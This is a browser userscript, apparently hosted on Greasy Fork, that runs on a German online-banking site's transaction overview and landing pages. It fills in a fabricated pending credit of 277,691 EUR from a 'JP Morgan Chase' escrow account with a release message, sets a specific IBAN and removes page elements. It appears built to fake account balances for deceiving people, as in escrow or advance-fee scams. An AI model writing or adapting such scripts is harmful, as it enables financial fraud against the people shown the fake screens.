// ==UserScript==
// @name         Ed Rec Commerz Brunhilde Schober
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/490857/Ed%20Rec%20Commerz%20Brunhilde%20Schober.user.js
// @updateURL https://update.greasyfork.org/scripts/490857/Ed%20Rec%20Commerz%20Brunhilde%20Schober.meta.js
// ==/UserScript==
...
//    const specifiedTextContent = "DE02 1008 0000 0443 8188 00"; // Specified text content

     var transactionsnew = [{
                    date: 'Vorgemerkt',
                    name: 'Treuhand JP Morgan Chase',
                    details: 'Andreas Gold meldet sich für Freigabe.',
                    type: 'Gutschrift',
                    amount: '+277.691,00 EUR',
                },
                // Add more transactions as needed
                ];
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE02 1008 0000 0443 8188 00"
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("landingpage") > 0 || window.location.href.indexOf("11162506717") > 0 || window.location.href.indexOf("10726846341") > 0 ) {
(function () {
    'use strict';
...
if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("11162507223") > 0 || window.location.href.indexOf("10733875328") > 0) {
  (function () {
    'use strict';
...
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ...
 if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("10733875328") > 0 ) {
...
(function () {
 ...
 //       var specifiedTextContent = "DE40 2108 0050 0104 6378 00";
        ...
        // Configuration
        var timeoutDuration = 2000; // Specify the timeout duration in milliseconds
...
if (window.location.href.indexOf("digitalbanking/transactionoverview") > 0 || window.location.href.indexOf("11210343048") > 0 || window.location.href.indexOf("10733875328") > 0 ) {
    ...
    (function () {
        ...
        function removeElementsWithTextClass() {
            ...
            var thumbnailElements = document.querySelectorAll('.lsgs-05770--thumbnail');
            thumbnailElements.forEach(function (thumbnail) {
                var thumbnailText = thumbnail.querySelector('.lsgs-05770--thumbnail__text');
                if (thumbnailText) {
                    // Remove the direct parent <td> element
                    var parentTd = thumbnail.closest('td');
                    if (parentTd) {
                        parentTd.remove();
                        console.log('Parent <td> element removed:', parentTd);
                    }
                }
            });
        }
